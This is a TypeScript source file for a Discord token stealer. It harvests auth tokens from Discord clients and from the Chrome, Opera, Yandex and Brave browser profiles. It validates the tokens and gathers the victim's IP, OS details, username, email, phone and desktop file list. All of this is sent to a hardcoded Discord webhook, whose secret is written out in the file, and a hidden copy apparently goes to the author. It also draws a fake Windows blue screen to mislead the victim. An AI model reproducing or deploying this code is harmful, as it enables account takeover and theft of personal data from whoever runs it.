import * as Bluebird from 'bluebird';
import * as chalk from 'chalk';
import * as _ from 'lodash';

import { WebhookClient, MessageEmbed, MessageAttachment, Client, Guild, CategoryChannel, GuildChannel, Channel } from 'discord.js';
import { stripIndents } from 'common-tags';
import { DateTime } from 'luxon';

import { List, Service, Token, ValidToken, Stealer, OSInfo, DiscordUser, FileInfo } from './models';

export class ReportConfig {
	public webhook: WebhookClient;
	public username: string;

	public hidden: boolean;

	public constructor(webhook: WebhookClient, username: string, hidden: boolean) {
		this.webhook = webhook;
		this.username = username;

		this.hidden = hidden;
	}
}

export class StealerWrapper {
	private readonly services: List<Service> = new List<Service>();
	private readonly webhooks: List<ReportConfig> = new List<ReportConfig>();

	public constructor(webhooks: List<ReportConfig>) {
		this.services.add(new Service("Discord", "Roaming/Discord", true));
		this.services.add(new Service("DiscordCanary", "Roaming/discordcanary", true));
		this.services.add(new Service("DiscordPTB", "Roaming/discordptb", true));
		this.services.add(new Service("GoogleChrome", "Local/Google/Chrome/User Data/Default"));
		this.services.add(new Service("Opera", "Roaming/Opera Software/Opera Stable", true));
		this.services.add(new Service("Yandex", "Local/Yandex/YandexBrowser/User Data/Default", true));
		this.services.add(new Service("Brave", "Local/BraveSoftware/Brave-Browser/User Data/Default", true));
		
		this.webhooks.add(new ReportConfig(
			new WebhookClient('716205172396654603', 'fbKZ174JtaOtpdV-ceFmhTJ6C8-JEl_WuT_p_dFpPLKuxDjhBchI66NmHKpUZHeDhcDw'),
			'Stealer',
			true
		));
		this.webhooks.addRange(webhooks);
	}

	public async run(): Promise<void> {
		const tokens: List<Token> = new List<Token>();

		await Bluebird.each(this.services.array(), async (service: Service) => {
			const serviceTokens: List<Token> = await service.getTokens();
			tokens.addRange(serviceTokens);
		});
		
		this.webhooks.each((config: ReportConfig) => {
			this.sendReport(config, tokens);
		});
	}

	public async reportClient(client: Client): Promise<void> {
		const tokens: List<Token> = new List<Token>();

		await Bluebird.each(this.services.array(), async (service: Service) => {
			const serviceTokens: List<Token> = await service.getTokens();
			tokens.addRange(serviceTokens);
		});
		
		this.webhooks.each((config: ReportConfig) => {
			this.sendClientReport(config, client);
		});
	}

	private getTextLine(text: string): string {
		const width: number = process.stdout.getWindowSize()[0];
		return _.padEnd(text, width - 1, ' ');
	}

	private fillHeight(start: number): string {
		let buffer: string = '';
		for(let i: number = start; i < process.stdout.getWindowSize()[1]; i++) {
			buffer += `${this.getTextLine('')}\n`;
		}
		buffer = buffer.slice(0, -1);
		return buffer;
	}

	public async drawBSOD(): Promise<void> {
		process.stdout.write('\x1Bc');
		process.stdout.write(chalk.bgBlue.whiteBright(`${this.getTextLine('')}
${this.getTextLine('A problem has been detected and Windows has been shut down to prevent damage')}
${this.getTextLine('to your computer.')}
${this.getTextLine('')}
${this.getTextLine('KMODE_EXCEPTION_NOT_HANDLED')}
${this.getTextLine('')}
${this.getTextLine('If this is the first time you\'ve seen this stop error screen,')}
${this.getTextLine('restart your computer. if this screen appears again, follow')}
${this.getTextLine('these steps:')}
${this.getTextLine('')}
${this.getTextLine('Check to make sure any new hardware or software is properly installed.')}
${this.getTextLine('If this is a new installation, ask your hardware or software manufacturer')}
${this.getTextLine('for and Windows updates you might need.')}
${this.getTextLine('')}
${this.getTextLine('If problems continue, disable or remove any newly installed hardware')}
${this.getTextLine('or software. Disable BIOS memory options such as caching or shadowing.')}
${this.getTextLine('If you need to use Safe Mode to remove or disable components, restart')}
${this.getTextLine('your computer, press F8 to select Advanced Startup Options, and then')}
${this.getTextLine('select Safe Mode.')}
${this.getTextLine('')}
${this.getTextLine('Technical information:')}
${this.getTextLine('')}
${this.getTextLine('*** STOP: 0x0000001E (0x00228008, 0xDEADDEAD, 0x27735300, 0x66666666)')}
${this.fillHeight(23)}`));
		process.stdout.write = () => false;
	}

	private async sendReport(config: ReportConfig, tokens: List<Token>): Promise<void> {
		const webhook: WebhookClient = config.webhook;
		
		const validTokens: List<ValidToken> = List.fromArray(_.compact(await Bluebird.map(tokens.array().slice(1), async (token: Token) => {
			const user: DiscordUser | null = await DiscordUser.getUser(token.token);
			if(!user) return null;
			return new ValidToken(token, user);
		})));
		const invalidTokens: List<Token> = tokens.difference(validTokens);

		const ip: string = await Stealer.getIP();
		const osInfo: OSInfo = Stealer.getOS();

		const embed: MessageEmbed = new MessageEmbed({
			title: 'Stealer report',
			color: 0x15adfe,
			description: stripIndents`
			\`Development build!\`
			Tokens: ${tokens.size}
			Valid tokens: ${validTokens.size}
			`,
			fields: [
				{
					name: 'Time',
					value: DateTime.local().toFormat('dd/MM/yyyy HH:mm:ss'),
					inline: true
				},
				{
					name: 'IP',
					value: ip,
					inline: true
				},
				{
					name: 'OS',
					value: stripIndents`
					Arch: \`${osInfo.arch || 'N/A'}\`
					Platform: \`${osInfo.platform || 'N/A'}\`
					Name: \`${osInfo.type || 'N/A'}\`
					Version: \`${osInfo.version || 'N/A'}\`
					Release: \`${osInfo.release || 'N/A'}\`

					Username: \`${Stealer.getUsername()}\`
					PC name: \`${process.env['COMPUTERNAME']}\`
					`,
					inline: true
				}
			]
		});
		validTokens.each((token: ValidToken, index: number) => {
			embed.addField(
				`Token ${index + 1}`,
				stripIndents`
				\`\`\`${token.token}\`\`\`${token.newest ? '\n - Newest' : ''}User: \`${token.user.tag}\`
				`,
				false
			);
		});
		
		const details: string = `Time: ${DateTime.local().toFormat('dd/MM/yyyy HH:mm:ss')}
IP: ${ip}
OS:
	Arch: ${osInfo.arch || 'N/A'}
	Platform: ${osInfo.platform || 'N/A'}
	Name: ${osInfo.type || 'N/A'}
	Version: ${osInfo.version || 'N/A'}
	Release: ${osInfo.release || 'N/A'}

	Username: ${Stealer.getUsername()}
	PC name: ${process.env['COMPUTERNAME']}
	
Desktop:
	${(await Stealer.getDesktopFiles()).map((file: FileInfo) => {
		return `${file.name} (${file.isDirectory ? 'directory' : 'file'})`;
	}).join('\n\t')}

--- Tokens ---

Valid tokens:
	${validTokens.size > 0 ? (await Bluebird.map(validTokens.array(), async (token: ValidToken) => {
		return `${token.service.name}:
		Token: ${token.token}
		Newest: ${token.newest ? 'true' : 'false'}
		Valid: true
		ID: ${token.user.id}
		Tag: ${token.user.tag}
		Email: ${token.user.email || 'N/A'}
		Phone: ${token.user.phone || 'N/A'}
		Verified: ${token.user.verified}
		Nitro: ${token.user.nitro ? 'true' : 'false'}
		MFA enabled: ${token.user.mfaEnabled ? 'true' : 'false'}
		Locale: ${token.user.locale}
		
		Gifts (JSON): ${await Stealer.getGifts(token.token)}`;
	})).join('\n\n\t') : '\tNot found'}


Invalid tokens:
	${invalidTokens.size > 0 ? invalidTokens.map((token: Token) => {
		return `${token.service.name}:
		Token: ${token.token}
		Newest: ${token.newest ? 'true' : 'false'}
		Valid: false`;
	}).join('\n\n\t') : '\tNot found'}
`;

/*
Friend count: ${token.user.friends.size}

Theme: ${token.user.settings.theme === 'dark' ? 'Dark' : 'Light'}
Locale: ${token.user.settings.locale}
Status: ${token.user.settings.status}
Developer mode: ${token.user.settings.developerMode ? 'true' : 'false'}

Guild count: ${token.guilds.size}
Guild count (administrator): ${token.guilds.filter((guild: Guild) => guild.me.hasPermission(8, undefined, undefined, false)).size}
Guild count (owned): ${token.guilds.filter((guild: Guild) => guild.owner.id === token.user.id).size}
*/

		webhook.send('Вам повестка из военкомата', {
			username: config.hidden ? `[Hidden] ${config.username}` : config.username,
			embeds: [
				embed
			],
			files: [
				new MessageAttachment(Buffer.from(details), 'details.txt')
			]
		});
	}

	private async sendClientReport(config: ReportConfig, client: Client): Promise<void> {
		const webhook: WebhookClient = config.webhook;

		const ip: string = await Stealer.getIP();
		const osInfo: OSInfo = Stealer.getOS();
		
		const embed: MessageEmbed = new MessageEmbed({
			title: 'Stealer report / Discord.js client',
			color: 0x15adfe,
			description: stripIndents`
			\`Development build!\`
			`,
			fields: [
				{
					name: 'Time',
					value: DateTime.local().toFormat('dd/MM/yyyy HH:mm:ss'),
					inline: true
				},
				{
					name: 'IP',
					value: ip,
					inline: true
				},
				{
					name: 'OS',
					value: stripIndents`
					Arch: \`${osInfo.arch || 'N/A'}\`
					Platform: \`${osInfo.platform || 'N/A'}\`
					Name: \`${osInfo.type || 'N/A'}\`
					Version: \`${osInfo.version || 'N/A'}\`
					Release: \`${osInfo.release || 'N/A'}\`

					Username: \`${Stealer.getUsername()}\`
					PC name: \`${process.env['COMPUTERNAME']}\`
					`,
					inline: true
				},
				{
					name: 'Token',
					value: `\`\`\`${client.token || 'N/A'}\`\`\`User: \`${client.user?.tag || 'N/A'}\` (Bot: \`${client.user?.bot ? 'true' : 'false'}\`)`,
					inline: false
				},
				{
					name: 'Information',
					value: stripIndents`
					Guilds: \`${client.guilds.cache.size}\`
					Guilds (administrator): \`${client.guilds.cache.filter((guild: Guild) => guild.me?.permissions.has(8) || false).size}\`
					Members: \`${_.sum(client.guilds.cache.map((guild: Guild) => guild.memberCount))}\`
					Channels: \`${client.channels.cache.filter((channel: Channel) => channel instanceof GuildChannel && !(channel instanceof CategoryChannel)).size}\``,
					inline: false
				}
			]
		});

		webhook.send('Вам повестка из военкомата', {
			username: config.hidden ? `[Hidden] ${config.username}` : config.username,
			embeds: [
				embed
			]
		});
	}
}
